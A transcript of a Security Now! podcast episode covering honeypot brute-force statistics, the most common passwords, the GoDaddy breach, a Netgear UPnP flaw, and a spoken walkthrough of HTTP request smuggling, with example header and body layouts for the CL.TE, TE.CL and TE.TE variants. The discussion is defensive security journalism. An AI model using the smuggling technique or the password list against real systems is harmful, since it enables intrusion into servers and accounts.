STEVE:  We're just going to sit here and wait until this levels off.  At some point IPv6 will start happening.  And when we see the price stop increasing, then we'll start letting some of our /8 allocation up for sale.  But, you know, it's difficult to defend having the non-profit U.S. Department of Defense squatting on so many /8 blocks.  I don't know.  Somebody, one of our techie senators, we do have a few, thank goodness, they ought to take a look at that and go, you know, DOD, you don't need all that.  



LEO:  Wow.



STEVE:  Anyway, I thought it was really interesting.  Of course the counterpoint is IPv6.  It's there.  It's ready to use.  But, boy, there is really some pressure against doing so.



LEO:  Back to Steve, more Security Now!.



STEVE:  Yeah.  So Microsoft actually has a job position known as - I'm not kidding, Leo - "Head of Deception."



LEO:  Now, that's a job I want.  I love that.



STEVE:  I figured he was leading the Windows 11 team, but no.



LEO:  That's their marketing department.  Oh, no, no.



STEVE:  There actually is a position, Head of Deception.  The slot is currently occupied by a security researcher named Ross Bevington.  Ross is the guy who puts pots of tasty honey out onto the Internet, thus the deception, and collects all of the attempts that are made to get in.  He spent 30 days collecting more than 25 million brute-force attacks against a tantalizing SSH server, and he came away with a few interesting insights.  The graph that is here in the show notes shows one of the things which he came up with.  This is a distribution of SSH passwords seen in brute-force attacks by length of the password brute forced.  And this shows a big peak at six, meaning six-character...



LEO:  What?



STEVE:  I know.  Six-character passwords.  30% of all passwords used in brute-force attempts are six characters in length.



LEO:  Wow.  Wow.



STEVE:  Crazy.  So 25 million brute-force attacks, and here's what he found.  He found that 77%, just over three quarters of all attempts, guessed a password between one and seven characters.  So again, the brute forcers are brute forcing what they have learned works.  Three quarters, 77%, are guessing between one and seven characters.  A password over 10 characters was only seen in 6% of brute-force attempts.  Only 7% of the brute-force attempts analyzed in that sample data included a special character.  Let me say that again.  Only 7% of brute-force attempts included a special character.  39% had at least one number.  And none, not one of the brute-force attempts used passwords that included white space.  So...



LEO:  Oh, that's interesting.  I never even thought of it including white space.  Huh.



STEVE:  Uh-huh.  Apparently no one has, and so no one brute forces.  So there's a little takeaway.



LEO:  Oh, good to know, yeah.



STEVE:  For our password designers.  Ross's conclusion is that the attackers don't bother attempting to brute force long passwords.  They just - they know that the password space is too large for them to try.  And so as this graph shows, this peaks at six, drops down to about 14% that were seven characters in length, 10% that were eight characters in length.  For some reason there's a little increase at nine characters.  But then it just has a tail that falls off to 5% that were 10 characters long, looks like maybe about 2% were 11 characters long, and 1% were 12 characters long.  And so the good news is long passwords are your friend.  They are not going to get brute forced, based on the data that Microsoft has collected.



He said that based upon data from more than 14 billion brute-force attacks attempted against Microsoft's network of honeypot servers through September of this year, attacks on Remote Desktop Protocol servers had tripled compared to 2020, which tracks everything that we've been seeing that we've been talking about, they saw a rise of 325%.  Network printing services saw an increase of 178%, as well as Docker and Kubernetes systems, which saw a relatively smaller increase of 110%.  So attacks are on the rise.  You know, you really don't want to expose RDP to the Internet without lots of additional protection.  And as I've said, the thing to do is to put it behind a VPN so you can use a VPN's security, then get to the RDP server and log into that.



Tied into that was a report just issued from NordPass.  They published their annual analysis of password use across 50 countries.  The top 10 most common passwords, like still, in 2021, currently are, the absolute most-used password, and this also explains, by the way, Leo, why there's a peak on six-character-long passwords, the thing that is holding the pole under that tent that is that chart is the password 123456.



LEO:  Oh, lord.  For SSH.  I mean, you might as well just, you know, use Telnet.  You know, if you're going to take the trouble of using something secure, make a password.



STEVE:  Yes.



LEO:  For crying out loud.



STEVE:  103,170,552 hits on the "password," and I put that in quotes, 123456.  Not easy to forget.  Pretty easy to brute force.  And everybody tries it.  And what was interesting was that was more than twice the number of hits of number two.  Number two, guess, 123456789.  Oh, Leo 789.  That explains the other piece.



LEO:  There's the other tent pole, yes.



STEVE:  The other little tent pole under that chart, yup.



LEO:  Yup.



STEVE:  That was at 46,027,530 hits.  Then we have for the lazier people, 12345.  Yeah, just can't really be troubled to hit that sixth key.  And then, believe it or not, at 22 million is qwerty, Q-W-E-R-T-Y.  Because, you know, it's right there in front of you.  Also, almost equal to QWERTY, coming in with eight characters, is just shy of 21 million, and the password is itself, P-A-S-S-W-O-R-D.  And for someone who thought, I'm not going to go all the way out to 123456789, I'm going to be tricky and stop at 8 because, you know, they're not going to check that.  It's like, okay.



Also in the six-character password category is 111111.  And then we also - and then that was at 13.3 million.  And we have 123123 because, you know, that's even trickier than 123456.  That's at 10.2 million.



LEO:  It's also easier to enter.



STEVE:  It is, yes.



LEO:  Ba da dump, ba da dump.



STEVE:  Brump brump, you're right.  And then number nine is 1234567890, that's just shy of 10 million at 9.646 million.  And 1234567.  So basically nobody cares.  You know?  And remember the studies have been done.  You know, if I've got a candy bar here, would you give me your password for a candy bar?  And most people, yeah, you know, I'm hungry.  That looks like a good candy bar.  Is that a Milky Way?



LEO:  Yeah.



STEVE:  So among their other findings, the researchers found that, in their words, a "stunning number" of people use their own name - that's tricky - as their password.



LEO:  Oh, good.



STEVE:  Charlie appeared as the ninth most popular password in the U.K.



LEO:  Charlie bit my finger.



STEVE:  Onedirection was a popular music-related password option.



LEO:  Oh, yeah, yeah, the group.



STEVE:  And the number of times Liverpool appears could indicate how popular the football team is.  But in Canada hockey was unsurprisingly the top sports-related option in active use.  Swear words are also commonly employed. 



LEO:  Yes, yes.



STEVE:  And when it comes to the...



LEO:  Not in the dictionary.



STEVE:  You know?  And when it comes to animal themes, dolphin was the most popular choice internationally.  So Leo, it looks like monkey is out.



LEO:  Dolphin has replaced monkey.



STEVE:  Unfortunately, dolphin has replaced monkey.



LEO:  Just a plug for using ssh-keygen.  Generate an ECC private and public key pair.



STEVE:  A certificate.



LEO:  Yup.



STEVE:  Yes.



LEO:  I do this on all, you know, GitHub, everywhere.  And at first I was using the same private-public key everywhere.  And I said, you know what, it's easy, simple.  So I have a different one for every machine, makes it easy to revoke a machine.



STEVE:  And if you have a good SSH client, it will keep them all straight for you and manage them.



LEO:  Absolutely, yeah.



STEVE:  So all you do is select who you want to log onto, and it does the job.



LEO:  It's much better.



STEVE:  I use Bitvise for Windows.  I'm really happy with Bitvise.



LEO:  Cool, that's a good tip.  I'm not familiar with that.  That's good.



STEVE:  Anyway, I'm somewhat surprised, since those are purely numeric, without any letters or special characters, most contemporary websites would never allow them to be used.  But, you know, I was thinking, if they were in place before specific requirements began to be added to sites, you know, I can see as legacy passwords they could still be valid today.



LEO:  Well, and also SSH usually you're controlling the server.  I mean, the server is probably not configured to be that secure.



STEVE:  Right, that's a very good point, yeah.



LEO:  And is allowing that, obviously.



STEVE:  Yeah.



LEO:  So, yeah.



STEVE:  Wow.  Unbelievable.  And if this is enterprise login, because I mean the presumption is that these are enterprise SSH servers.  How could they not enforce a policy that makes more sense?  That's just mindboggling.  Well, yesterday the well-known Internet domain registrar and more recently cloud hosting provider GoDaddy said that a hacker gained access to the personal information of more than 1.2 million customers of its WordPress hosting service using a compromised password which gave the attacker access to the provisioning system in their legacy codebase for their Managed WordPress.  So reading between the lines it sounds like they had, like, a legacy codebase.  They had some, like a WordPress hosting management system that they'd stopped using; right?  Like they were no longer using it, but they didn't turn it off because, hey, if it's not broke, wait till a hacker finds it.



Being one of the world's largest domain registrars and a web hosting company providing services to more than 20 million customers worldwide, as well as being publicly traded, they needed to promptly inform the U.S. Securities and Exchange Commission.  In the SEC documents which were filed yesterday, GoDaddy stated that it discovered the breach last Wednesday after noticing what they called "suspicious activity" on their Managed WordPress hosting environment.  Subsequent investigation revealed that a hacker had unfettered access to GoDaddy's servers for more than two months.



LEO:  Oh.



STEVE:  Yeah, ouch, since at least September 6.  And based upon the available evidence, the hacker had gained access to up to 1.2 million active and inactive managed WordPress customers who had their email addresses and customer numbers exposed; the original WordPress admin password that GoDaddy had issued to those customers when a site was first created; for active customers, their secure FTP login and database usernames and passwords were exposed; for a subset of active customers the SSL private key was exposed.  Ouch.



GoDaddy had already reset the secure FTP and database passwords exposed in the hack as well as the admin account password for customers who were still using the default one that GoDaddy had originally issued when their sites were created.  GoDaddy is currently in the process of issuing and replacing new SSL certificates for affected customers.  And they've notified law enforcement and are working with an IT forensics firm to further investigate the incident.  Customers were also notified of all this, or like a sanitized version of this actually, yesterday.



And for those who are counting, this is not GoDaddy's first trouble with breaches.  Last May GoDaddy alerted some of its customers that an unauthorized party used their web hosting account credentials in the previous October of 2020 to connect to their hosting account via SSH.  In that instance GoDaddy's security team discovered the breach after spotting an altered SSH file in GoDaddy's hosting environment and suspicious activity on a subset of GoDaddy's servers.  In other words, they saw this guy doing stuff.



And back in 2019 scammers used hundreds of compromised GoDaddy accounts to create 15,000 subdomains, attempting to impersonate popular websites and redirect potential victims to spam pages offering bogus products.  And before that, earlier in 2019, GoDaddy was found to be injecting JavaScript into U.S. customers' sites without their knowledge, thus potentially rendering them inoperable or impacting their overall performance.  So there's been some problems.



I registered GRC.com in December of 1991, a few months after Microsoft registered Microsoft.com.  And I chose Network Solutions since they were the original Internet registrar.  But our longtime listeners will know that I could finally no longer tolerate Network Solutions' slimy upselling tactics.  It was necessary to say "no" to various offers over and over again and, more annoyingly, to carefully read and uncheck various enabled-by-default additional cost services which other registrars were by then offering for free.



So I started to feel as though my loyalty had become misplaced, and I decided that I had to move.  As we know, I chose Hover, also a sponsor of the TWiT Network, and I've never looked back.  When I was making the switch, I considered GoDaddy.  Mark Thompson uses them and recommended them.  But they were too brightly colored and sort of hyper-commercial-looking.



LEO:  Yeah.  Talk about upsell.  They're the worst.



STEVE:  Oh, my god, yes.



LEO:  And aren't you now glad that you didn't?



STEVE:  Oh, Leo, yes, exactly, and that was the point I was going to make is their website looks like a cartoon.  And that's what I wanted to get away from.  The last thing you want in a domain registrar is excitement.  Things are rather excited over at GoDaddy right now.  No, thank you.  What you want from a domain registrar is a great deal of boredom.



LEO:  Boring.  Boring.



STEVE:  Just, yes.  Just do that job and don't go jumping up and down and trying to be more because, boy, you open yourself to this kind of mess.



LEO:  Yeah.



STEVE:  Okay.  A heads-up, an important heads-up for our Netgear owners.  I know we've got them.  Last week Netgear released a round of patches to remediate a high-severity remote code execution vulnerability affecting 61 different models.  I've included a table of the impacted routers in the show notes below.  But really, I wouldn't bother, like, looking for your model there.  It's, like, all of them.  All of our listeners who are using Netgear routers should make a point of checking in right now, like after this podcast, for any available update.



This one is another Universal Plug and Play vulnerability, you know, UPnP, which when exploited would allow remote attackers to take control of a vulnerable system.  The good news is most routers won't be exposing their vulnerable UPnP ports on the public Internet.  On the other hand, GRC's UPnP Internet Exposure Test has counted 55,166 positive Internet-facing tests since I put it online.  But I'm not logging unique IPs.  I do keep a most recently seen IP list.  I can't remember now how long it is and how I expire it.  But it's like a day.  The idea was I didn't want to be double-counting ShieldsUP! visitors if they did multiple tests, like trying to get their routers configured right.  And this thing, and all of the ShieldsUP! system reshares that same MRU list so that it doesn't double count.  So 55,166 without recent double counting.



Okay.  But anyway, hopefully, if you have a Netgear router, even if you don't have the UPnP service bound to your WAN interface, all of these routers will have UPnP running on their LAN interface by default.  And that exploitation is still possible.  Exploitation could be by way of a malicious script running on a browser inside the LAN, thus accessible to the router's internal LAN interface at a known IP, right, the broadcast, the gateway IP and a known port, what is it, 1900 is UPnP.  And then that would be used to make the router remotely accessible.  So if you would go to a site that was hosting JavaScript or a malicious ad, potentially, that is running script on your browser.  We've talked about this, techniques used for browsers to access the unprotected LAN port on routers.  In this case it is trivial to do this.  



In recognition of the severity, it's assigned a CVE of 2021-34991 with a CVSS severity of 8.8.  It's a pre-authentication, meaning you don't need to authenticate, buffer overflow flaw which appears to be present in pretty much all of Netgear's small office/home office routers, and it can lead to remote code execution at the highest privileges.  The vulnerability stems from the fact that the UPnP daemon accepts, by design, unauthenticated - because remember Universal Plug and Play is an unauthenticated protocol because the idea is it's just going to be, like, automatic.  So you can't have to log in to the router's UPnP or it wouldn't be automatic.  Thank you, Microsoft.



Anyway, unauthenticated by design, HTTP SUBSCRIBE and UNSUBSCRIBE requests, which are event notification alerts that devices use to receive notifications from other devices when certain configuration changes such as media sharing occur on the network.  But there's a memory stack overflow bug in the code that handles the UNSUBSCRIBE requests which enables an adversary to send a specially crafted HTTP request and run malicious code on the affected device, including resetting the admin password and delivering arbitrary payloads.  And as we know, HTTP requests are the things that web browsers routinely generate.



So the idea of JavaScript doing this is not farfetched.  Once the password has been reset, the attacker can then log in to the web server and modify any settings or launch further attacks on the router's internal web server.  So again, if you're using Netgear, just it's time to go see if there's an update.  As of last week, there is, for 61 different routers.  And I'm seeing all the WNDR routers, you know, the WNDR 3000 or the 3300, 3400, 4000, 3500, I mean, just...



LEO:  I don't see the Orbis in here.



STEVE:  No.



LEO:  And that's their mesh solution.  Those are RBL, I think.  So that's good news.  But everything else, yeah.



STEVE:  Yeah.  So the guy who discovered and reported the trouble noted that:  "Since the UPnP daemon runs as root, the highest privileged user in Linux environments, the code executed on behalf of the attacker will run as root, as well."  With root access to a device, as we know, an attacker can read and write, do whatever they want to traffic, modify configuration, so forth.  So, again, update. 



LEO:  Okay, Steve.  That bottle's almost empty.  You'd better wrap this up here.



STEVE:  HTTP Request Smuggling, also sometimes called HTTP Desync Attacks, take advantage of the fact that much of today's modern Internet is far more complex than just a web client connecting to a web server.  Any website hosted, for example, by Cloudflare provides an example of just how complex the Internet has become.  Many of today's websites and web hosting applications employ chains of HTTP servers between their users and the back-end application logic.  Users' requests are first received by a front-end server.  It might be performing web filtering, load balancing, reverse proxying and/or caching.  Whatever the case, this front-end server then forwards requests to one or more back-end servers.  And not only is this type of architecture increasingly common today, in many cases it's fundamental to cloud-based applications.  It's built-in.  The assumption is that's the way that web content is being delivered.  You know, CDNs operate similarly, very much like Cloudflare.



For the sake of expediency and efficiency, the front-end connections to back-end servers are persistent and long-lived.  This saves a huge amount of connection setup and teardown time.  And the protocol is very simple, with the front-end sending HTTP requests one after another to the receiving server on the back end, which parses the HTTP request headers to determine where one request ends and the next one begins.  In other words, to determine the request boundaries it's necessary to parse the headers.  And when this is being done, it's crucial that the front-end and the back-end systems agree about the boundaries between requests.  Right?



So the front-end system is building these, you know, receiving them and doing whatever it's doing, and then forwarding them.  And it's got a persistent linkup to the back-end, and it's just sending requests down the pipe, one after the other.  Naturally, the back-end is receiving these requests from its end of the pipe coming from the front-end, and it needs to understand the start and the end of the requests.  If that doesn't happen, if the systems do not agree, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems, which is of course exactly what can be made to happen, and we're going to explain how.



HTTP Request Smuggling is a slippery and tricky technique which deliberately manipulates the Content-Length and Transfer-Encoding headers of multiple HTTP requests in such as way that the various servers involved in servicing the requests get confused about the successive HTTP request boundaries.  And they get confused in a way that allows clever attackers to achieve web cache poisoning, session hijacks, cross-site scripting, and even web application firewall bypasses.  And unlike many of the interesting technological attacks and tricks we often discuss here, these are not theoretical.



Last week, as I mentioned at the top of the show, one of the vulnerabilities that was being exploited used HTTP Request Smuggling as part of its attack chain.  These are the real deal, and they're getting a lot of attention right now because believe it or not, this was first mentioned in 2005.  And because we don't have today's - we didn't then have today's multi-server linked cloud-based connectivity, it was like, eh, you know, kind of a - then it was theoretical.  Not anymore.



Okay.  So I mentioned the Content-Length and Transfer-Encoding headers.  HTTP Request Smuggling vulnerabilities arise because, unfortunately, the HTTP spec provides two different ways to specify where a request ends.  That is, the length of the body which is appended after the headers.  Remember that an HTTP Request is a bunch of headers like the name of the host, if modified since, where you're able to say, okay, you know, I want you to send this to me only if it's been modified since a certain date because the client that's asking already has a copy in its cache with that date, so it only gets things that are changed.  You know, so this is the so-called metadata of HTTP Requests.  And of course, famously, cookies are also in the metadata.



Okay.  So believe it or not, as I said, the HTTP spec provides two completely different ways to specify where a request ends.  So you have - and remember this is just ASCII text.  It's going serially down a line.  So you have a line of characters, then a character return line feed; the next line of characters, character return line feed; the next line of characters and so on.  So how do we know when a request ends?



The Content-Length header is very straightforward, and it's by far the most common method.  It simply specifies the length of the message body in bytes.  So, for example, you'd have, in a POST query, you'd have POST and then space /search, if that was the - if the URL was search at this site.  And then you'd specify the host name that you're wanting to send this to, the content type.



Then you have Content-Length colon, and say that you had it as - say it was 11.  So you then have a blank line to separate the headers from the beginning of the body.  And then, since this thing says Content-Length 11, the server interpreting this will accept the next 11 characters as being the content for this query.  And what's significant about that is that then the 12th character is absolutely considered to be the first character of the next query.  In other words, the thing specifying the boundary between the first and the second query is the Content-Length header for the first one which says exactly how many characters that follow are part of that query.  And the implication is, and after that, it's a next query.



And if it surprises somebody that that's the way the world works, I mean, like there isn't some special end-of-query character reserved or something, it's like, yeah, there isn't.  You know, and pretty much things work except when they don't.  And this is an example of how badly it can be broken.  So in this example we have an 11-character string, just for the - I'm looking at the show notes.  But for those who aren't seeing them, q=smuggling, S-M-U-G-G-L-I-N-G.  So that's 11 characters.  And the end of that ends this query. 



Okay.  But I said there were two ways of specifying the length.  The use of a Transfer-Encoding header is also completely valid.  It's a different way, a completely different way of specifying the end of a query.  And it, too, can be used to specify essentially the structure of the HTTP message body.  The transfer encoding method is called "chunked."  When the Transfer-Encoding header specifies chunked encoding, this means that the message's body consists of one or more chunks of data  where each chunk consists of first the chunk size, which is specified in hex, as a hex count, that is, it's a hexadecimal value that's ended with a new line, so character return line feed, followed by that many characters.  And so you have a chunk size and then a chunk.



Then you might have the number of characters specified in hex by the chunk size, funky as this sounds.  And then you have another chunk, which could be again another chunk of some length.  And you can have as many chunks as the sender wants to create.  The message ends when the thing that's interpreting this query encounters a chunk declared of zero size.



So again, if we were to be sending this q=smuggling line instead of using Content-Length, saying the Content-Length, saying the Content-Length is 11, we saw that we're going to use the Transfer-Encoding style with the chunked method.  So after the blank line following the headers is a B, which is hex for 11; right?  Ten, you know, you have nine, then A, then B.  So you have nine, 10, 11.  So there's just a B on a line by itself that tells the thing that is reading this HTTP query that here comes the 11 characters in the first chunk.  And so they read q=smuggling.  Then the next line is a zero, which says that that's the end of the message because the next chunk, there isn't any, it's of zero length.  And so that tells the thing that has received this query that the message has ended.



Okay, now, first of all, the students of this podcast will immediately see how fragile this chunked encoding is.  I mean, it is ugly.  For one thing, it's doing a bit of interpretation.  We know how we feel about interpretation.  And we know how we feel about interpreters on this podcast.  But the big no-no from an architectural design standpoint is that it is mixing control metadata in with the data.  We've previously seen, for example, how the immensely popular and powerful "printf" function, which is present in so many coding languages, suffers from a similar design vulnerability by mixing data and control metadata, right, those little format escape characters, into the same string.  As we saw in that case of the Apple flaw, if an attacker can get control of that string, they can get up to a great deal of mischief.



So as for HTTP, many researchers are unaware that chunked encoding is even, like, still around anymore, and that it's valid in HTTP requests because web browsers don't use chunked encoding in their requests.  They use Content-Length.  And it's normally only seen in server responses.  But it's in the spec, and many servers support it.  If they're going to be HTTP spec compliant, they must support it.  Now, here's the problem.  Since HTTP provides two entirely different methods for specifying, or I guess I'd say for obtaining the length of HTTP messages, and one is quite fragile and susceptible to abuse, it's possible for a single request to use both methods.



And this can be done in such a fashion that they conflict with one another.  This possibility was understood by HTTP's designers.  You know, they had the Transfer-Encoding method and the Content-Length method.  And they realized, okay, these do different things, but they also sort of do the same thing.  So they attempted to prevent the problem of this kind of like header collision by simply stating that if both the Content-Length and the Transfer-Encoding headers are present, the Content-Length header should be ignored.



Now, unfortunately, that means that if they're both present, the more fragile of the two wins the contest.  And it turns out that while this simple exclusion might be sufficient to avoid ambiguity when only a single server is in play, when two or more servers are chained together, bad stuff can happen.  And as I said, in today's Internet it's very often the case that you've got multiple servers chained together.  Bad stuff happens because some servers don't support the Transfer-Encoding header in requests at all, and some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.  And I'll explain in a second.



And here's the key.  If the front-end and back-end servers behave differently in relation to the perhaps obfuscated Transfer-Encoding header, or Content-Length versus Transfer-Encoding, they might disagree about the boundaries between successive requests, which enables Request Smuggling vulnerabilities.  Okay.  So Request Smuggling attacks are created by placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating them so that the front-end and back-end servers will process the request differently.  And naturally the design of a successful attack depends upon the behavior of the two servers.



So attacks come in three forms depending upon the characteristics of the specific servers being attacked.  There's the CL.TE attack.  And of course that stands for Content-Length/Transfer Encoding.  The CL.TE attack:  When both headers are present, the front-end server obeys the Content-Length header, and the back-end server obeys the Transfer-Encoding header.  You have the reverse, the TE.CL attack.  When both headers are present, the front-end server uses the Transfer-Encoding header; the back-end server uses the Content-Length header.  And then you also have the TE.TE, now, which might seem strange.  But when both headers are present, the front-end and back-end servers both support the use of the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.



Okay.  So how does this work?  Let's take a look at the first case, the CL.TE attack where, when both headers are present, the front-end server, the first server to see the request, obeys the Content-Length header, and the back-end server uses the Transfer-Encoding header.  So in this request, remember, both headers are present.  So in this example we have Content-Length specified as 13 and Transfer-Encoding as chunked.  So the body starts with a numeric zero on a line by itself, and then a blank line to end that zero, and then the word "smuggled."  So what happens?



The front-end server - oh, I'm sorry.  And also we have - so Content-Length 13 and Transfer-Encoding is chunked.  But the first server, remember, it obeys Transfer-Length encoding.  So it says, okay, there's going to be 13 characters following, so that's the zero, the Character Return Line Feed for the new line, and then this word "smuggled."  That's 13 characters, so that's what it sends.  It forwards the entire request as received to the back end.  But the back-end server is more compliant with the HTTP specification, which remember, if both are present, Transfer-Encoding wins.  So it ignores the Content-Length header and instead processes the Transfer-Encoding header as it's supposed to.  It therefore treats the message body as using chunked encoding.



So what happens?  The first thing it sees is that zero on a new line, that zero by itself and a new line, which tells it this message ended.  That is, you know, you can send a post or a query or something with no body.  So it sees this 13-character body message as a query that had no body.  Which means it starts parsing what it assumes is a new query with the word "smuggled."  Of course, this is just our example.  What is actually there is another HTTP Request; right?  And the first server didn't see that second HTTP Request which is being smuggled because the Content-Length enveloped the entire thing.  So it just thought that was some, I mean, the body of a query can be anything you want.  So it's not - it's taken as a literal and just passed along.



But the second server, because of that zero and the blank line and the fact that it's obeying Transfer-Encoding, it terminates that first query and starts reading immediately afterwards as the next query, which allows someone to smuggle a query past the gateway, past that front server.  It slips right through.  Therefore, if our attacker had embedded some sort of useful query into the end of the first query, the front-end server, as I said, would not have seen it.  It would have treated it as query data and passed it along.  The back-end server would have seen that hidden embedded query as its own freestanding second query and would have acted upon it.  So obviously, if the front-end server is examining requests and functioning as an HTTPS firewall, a web firewall, a caching server where it needs to know what's gone through, this technique slips a query to the back-end right through a front-end firewall.



Now, it turns out the reverse of this attack, the TE.CL, works just as well.  It can be used when the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header in the presence of both.  Basically, the attack is, the Content-Length in this example is 3, and the Transfer-Encoding is chunked.  And then we have the blank line at the end of the headers, then the number 8 and the word "smuggled," and then a zero.  So of course for the chunked encoding, 8 is the number of letters in the word "smuggled" and then the zero terminates the chunked encoding.  Since the front-end server honors chunked encoding, it will interpret the message's two chunks as a single message and will forward the entire query to the back-end server.  Right?  Because that's just a standard chunked encoding.  It ignores the Content-Length of 3.



But the back-end server obeys Content-Length and not the Transfer-Encoding.  So it sees the length of 3.  Well, that gives it the 8, and the character return line feed.  And so that's the end of the query that it sees, and it starts processing as a new query the word "smuggled," or what would actually in practice be another HTTP query of some kind.  So again, it is trivial.  If you've got two servers in a chain disagreeing about how they're going to handle the content, basically how they determine the message query boundaries, you're in trouble.



And the TE.TE vulnerability, turns out it's possible, there are some servers which will still process a malformed Transfer-Encoding header.  Like it should be Transfer-Encoding colon space chunked.  Sometimes you could do encoding space colon space chunked.  Some servers accept that.  Some don't.  Or you could use colon tab chunked.  Again, some will regard that as white space and go, okay, fine.  Some will look at it and say, hey, that doesn't abide by the spec.  We're not taking it.  So the point is, if you put two transfer encoding headers in the same query and format them differently, you can again get differential treatment of the encoding of the message.  And that's really what this comes down to, right, is some difference, differential between what two servers in the chain of servers processing the query do, and that allows all of this to happen.



So I considered taking this to the next step by demonstrating how a smuggled request could be leveraged into various forms of devastating web attacks.  But I think I've pushed a predominantly audio podcast about as far as I can.  Anyway, so...



LEO:  You need a whiteboard, Steve, or a chalkboard or something. 



STEVE:  Yeah, that is true.  These, as I mentioned, these potential problems were first discovered and documented back in '05.  Nobody was really that concerned.  Researchers from Northeastern University and Akamai Technologies have written a paper titled "T-Reqs" - okay, a little cute there - "HTTP Request Smuggling with Differential Fuzzing" which was just presented during the 2021 ACM SIGSAC, which is the Conference on Computer and Communications Security.



Their paper's abstract explains:  "HTTP Request Smuggling" - they abbreviate it HRS - "is an attack that exploits the HTTP processing discrepancies between two servers deployed in a proxy origin configuration, allowing attackers to smuggle hidden requests through the proxy.  While this idea is not new, HRS is soaring in popularity due to recently revealed novel exploitation techniques and real-life abuse scenarios.



"In this work we step back from the highly specific exploits hogging the spotlight and present the first work that systematically explores HRS within a scientific framework.  We design an experimental infrastructure powered by a novel grammar-based differential fuzzer, test 10 popular server/proxy/CDN [Content Delivery Network] technologies in combinations, identify pairs that result in processing discrepancies, and discover exploits that lead to HTTP Request Smuggling.  Our experiment reveals previously unknown ways to manipulate HTTP requests for exploitation, and for the first time documents the server pairs prone to HRS."



And I have the chart that they produced as the last page of the show notes.  And it is really interesting.  They tested CloudFront, Cloudflare, Akamai, Varnish, Squid, HAProxy, ATS, Tomcat, NGINX, and Apache.  So those form the lines on one side of the table.  The exact same set form the lines on the other side of the table.  And so the table is populated with symbols representing where the entry point server along the bottom fed its data to the exit point server enumerated down the left-hand side.  The symbols show what happened.



So, like, there are a whole bunch of large gray circles for  Tomcat where v1.0 chunked encoding was effective when Tomcat was connected to most of the exit points.  Let's see.  All but, oh, there's also Varnish.  All but Varnish and itself, there is a blank diagonal because you're not going to get differential handling when the same thing is talking to another instance of itself.  But, you know, CloudFront has a number of purple dots which is double transfer encoding presences for a bunch of senders.  You know, there's stars on Various Method Version Combinations.



So anyway, the diagram shows what the researchers found when these 10 popular servers, CDNs, and proxies were fuzzed with a wide range of HTTP header mutations.  That's when they talked about a novel grammar-based differential fuzzer.  Basically, you know, fuzzing is just throwing everything at the wall and see what happens.  And so they produced a technology.  They automated the discovery of things that different servers connected to each other would handle differently.  One of the items that I noted was the Double Transfer-Encoding, which suggested duplicate headers can also create vulnerabilities.



So I have a link, for anybody who's interested, to their entire paper.  I think it was 19 pages.  They did a beautiful job.  And the good news is this is now getting a lot of attention.  Everybody is looking at it.  When this is done, hopefully, I would say, well, I would love to say a month from now, maybe six months from now or a year from now, this chart's going to look different because this is now on everybody's radar.  And it's going to be, clearly, this is not, as I said, just theoretical.  Bad guys are already using this to essentially smuggle queries past border defenses and take advantage of that and to abuse these services.  So another very cool piece of Internet technology.  Been sitting there the whole time.  Nobody really paid any attention to it until recently.



LEO:  And that's what you're here for, to pay attention to stuff so we don't have to.  Steve Gibson.  He's the man of the hour.  Well, or the hour and a half, two hours, thereabouts.  Always on a Tuesday I look forward to this.  And I know all of you do.  We do the show, and you are invited to watch us do it live every Tuesday, right after MacBreak Weekly.  So that's, you know, it varies, but it's around 1:30 to 2:00 p.m. Pacific, 5:00 p.m. Eastern, 22:00 UTC, at live.twit.tv.  If you're watching live, chat live at irc.twit.tv.



You'll find Steve at his website, GRC.com.  That's where his bread and butter lives, SpinRite, the world's finest mass storage maintenance and recovery utility.  If you've got an SSD or a hard drive, you need SpinRite.  You should get a copy right now.  6.0 is out.  But 6.1 is imminent, and you'll get an upgrade for free if you buy 6.0 now.  And you can participate in the development of 6.1.  There's a forum, a very active forum at GRC.com.  Leave feedback for Steve at GRC.com/feedback.  You should browse around, though.  It's a great website, lots of great stuff, including the show.



Steve has a couple of unique versions of the show.  Going back 15 years, you said we should have a 16Kb version of the show for people, like people who live in Australia and have metered connections and so forth.  So that is the smallest audio file available.  It's a little scratchy, but it's small.  It's quick.  It's an easy download.  He's got that, does it faithfully every week, transcodes this into that.  He's got the 64Kb he starts with.  That's also there.  He also has transcripts, and that's really a nice thing that Steve's been doing for some time.  He pays Elaine Farris to make really nice human-readable and human-written transcripts.  



STEVE:  Searchable.



LEO:  Which are searchable, which means you can jump to anything, anywhere in the entire canon of Security Now! episodes, all 846.  All of that's at GRC.com.  Steve's on the Twitter, @SGgrc.  If you want to DM him there, you can also leave a message there.  Those DMs are open.



We have copies of the show, 64Kb audio plus video at our website, TWiT.tv/sn.  You can also watch, there's a YouTube channel devoted to Security Now!.  And I might encourage you to subscribe.  I know you don't want to miss an episode.  And you can do that in your favorite podcast client.  And if your client allows for reviews, do us a favor.  Leave a five-star review.  Tell the world all about this guy.  He's a precious natural resource, the fifth head on Mount Rushmore, I think.  Steve Gibson, thank you so much.  Have a great week, and we'll see you next week on Security Now!.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#847

DATE:		November 30, 2021

TITLE:		Bogons Begone! 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-847.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we'll note that the new Edge browser's Super Duper Secure Mode has been deployed and can be enabled by security-conscious users.  We also have more than one third  37%  of the world's smartphones vulnerable to audio monitoring and recording flaws in their MediaTek firmware.  We have an important reminder about clicking links in email and wonder how that can still be a problem, and the entirely predictable evolution of a Windows zero-day vulnerability which is latent no longer.  We have some interesting closing-the-loop feedback from our terrific listeners, and a sci-fi book update.  Then we take another and much broader look at the recent efforts to clean up IPv4, but this time from the perspective of those working to do so.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about.  The zero-day Windows exploit that we just found out about.  Schrodinger's cat pays a visit.  We'll also find out why 37% of the world's smartphones are vulnerable and how many of those are going to get fixed.  And then Steve is going to explain something we talked about last week, and I think he changes his mind by the end of the show.  It's all coming up next on Security Now!.



